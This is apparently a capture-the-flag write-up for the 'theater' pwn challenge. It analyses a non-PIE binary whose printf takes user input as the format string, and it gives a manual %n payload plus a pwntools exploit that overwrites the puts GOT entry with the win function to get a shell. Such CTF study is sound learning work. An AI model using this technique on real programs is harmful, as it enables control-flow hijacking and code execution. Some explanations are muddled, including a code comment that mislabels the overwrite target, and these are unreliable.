# theater Writeup

## Challenge infos

```text
I really like going to the movies, what's your favourite?
Challenge is running at: nc pwnable.co.il 9011
```

## Executable analysis
### checksec output
```text
        Arch:       amd64-64-little
        RELRO:      🟡 Partial RELRO
        Stack:      🟢 Canary found
        NX:         🟢 NX enabled
        PIE:        🔴 No PIE (0x400000)
        SHSTK:      🟢 Enabled
        IBT:        🟢 Enabled
        Stripped:   🔴 No
```
* as we can see, the binary is not PIE, but very secure, it has a canary, NX bit is enabled, SHSTK is enabled, and IBT is enabled.
* this means that we know the address of all symbols in the binary.
### main disassembly
```asm
   0x000000000040132d <+0>:     endbr64
   0x0000000000401331 <+4>:     push   rbp
   0x0000000000401332 <+5>:     mov    rbp,rsp
   0x0000000000401335 <+8>:     sub    rsp,0x110
   0x000000000040133c <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401345 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401349 <+28>:    xor    eax,eax
   0x000000000040134b <+30>:    mov    eax,0x0
   0x0000000000401350 <+35>:    call   0x401296 <init_buffering>
   0x0000000000401355 <+40>:    lea    rdi,[rip+0xcb4]        # 0x402010
   0x000000000040135c <+47>:    mov    eax,0x0
   0x0000000000401361 <+52>:    call   0x401130 <printf@plt>
   0x0000000000401366 <+57>:    lea    rax,[rbp-0x110]
   0x000000000040136d <+64>:    mov    edx,0x100
   0x0000000000401372 <+69>:    mov    rsi,rax
   0x0000000000401375 <+72>:    mov    edi,0x0
   0x000000000040137a <+77>:    call   0x401150 <read@plt>
   0x000000000040137f <+82>:    lea    rdi,[rip+0xca8]        # 0x40202e
   0x0000000000401386 <+89>:    call   0x401100 <puts@plt>
   0x000000000040138b <+94>:    lea    rax,[rbp-0x110]
   0x0000000000401392 <+101>:   mov    rdi,rax
   0x0000000000401395 <+104>:   mov    eax,0x0
   0x000000000040139a <+109>:   call   0x401130 <printf@plt>
   0x000000000040139f <+114>:   lea    rdi,[rip+0xc94]        # 0x40203a
   0x00000000004013a6 <+121>:   call   0x401100 <puts@plt>
    ...
```
* the main function asks for a movie name, reads it from the user, and then prints it back.
* we can see that the buffer is passed as the first argument to the `printf` function, which means that it is valueable to formated string attack.

### formated string attack
* when the user has control over the format string, they can read from the stack and even write to it.
* because of the `%n` format specifier, which writes the number of bytes written so far to the address pointed to by the next argument.
* but what will we write? lets look for symbols in the binary:
```text
Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  puts@plt
0x0000000000401110  __stack_chk_fail@plt
0x0000000000401120  system@plt
0x0000000000401130  printf@plt
0x0000000000401140  alarm@plt
0x0000000000401150  read@plt
0x0000000000401160  srand@plt
0x0000000000401170  time@plt
0x0000000000401180  setvbuf@plt
0x0000000000401190  sleep@plt
0x00000000004011a0  rand@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  init_buffering
0x0000000000401316  win
0x000000000040132d  main
0x0000000000401470  __libc_csu_init
0x00000000004014e0  __libc_csu_fini
0x00000000004014e8  _fini
```
* we can see that the binary has a function called `win`. also the puts@plt is a good candidate for a format string attack, as it is used right after the printf function.
* so we will overwrite the got entery of `puts` with the address of the `win` function' so that after the `printf` function is called, the program will jump to the `win` function instead of the `puts` function.
* the payload will look like this:
```text
%4886c%9$lln%42c%10$hhna @@\x00\x00\x00\x00\x00"@@\x00\x00\x00\x00\x00
```
1. `%4886c` will print 4886 (0x1316) bytes, which is the lower bytes of the address of the `win` function.
2. `%9$lln` will write the number of bytes written so far to the address of the 9th argument, which is the address of the `puts` got entry.
3. `%42c` will print 42 bytes, now 0x1340 bytes have been printed.
4. `%10$hhna` will write the lower byte of number of bytes written so far (0x40) to the address of the 10th argument, which is the address of the `puts` got entry + 2.
5. ` @@\x00\x00\x00\x00\x00` will be the address of the `puts` got entry, which is 0x404020.
6. `"@@\x00\x00\x00\x00\x00` will be the address of the `puts` got entry + 2, which is 0x404022.

### why 9th and 10th arguments?
* the c call convention used by the binary is the System V AMD64 ABI, which means that the first six arguments are passed in registers, and the rest are passed on the stack.
* the arguments on the stack are pushed in reverse order, so the first argument is at the top of the stack.
* because our payload is save to a buffer at the top of the stack, is is actually the first (%rdi) and seventh 
(no the stack) arguments. and because on `payload` + 24/32  we save the address of the `puts` got entry, they are the 9th and 10th arguments.

### exploit code
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template theater
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'theater')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwnable.co.il', 9011, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()
win_addr = exe.sym['win']
puts_addr = exe.got['puts']
payload = fmtstr_payload(
    6,  # The first 5 arguments are registers, the 6th is on the stack (the payload string)
    {
        puts_addr: win_addr,  # Overwrite puts with win address
    },
    write_size='short'  # Use short writes to avoid overwriting other data
)
# The payload is crafted to overwrite the return address of the function
# that calls puts, redirecting it to win.
io.sendlineafter(b'your favourite movie? ', payload)

io.interactive()
```
* now, when we run the exploit, we should get a shell.
```
[+] Opening connection to pwnable.co.il on port 9011: Done
[*] Switching to interactive mode
You chose: 
$ cat flag
PWNIL{flag_is_here}
```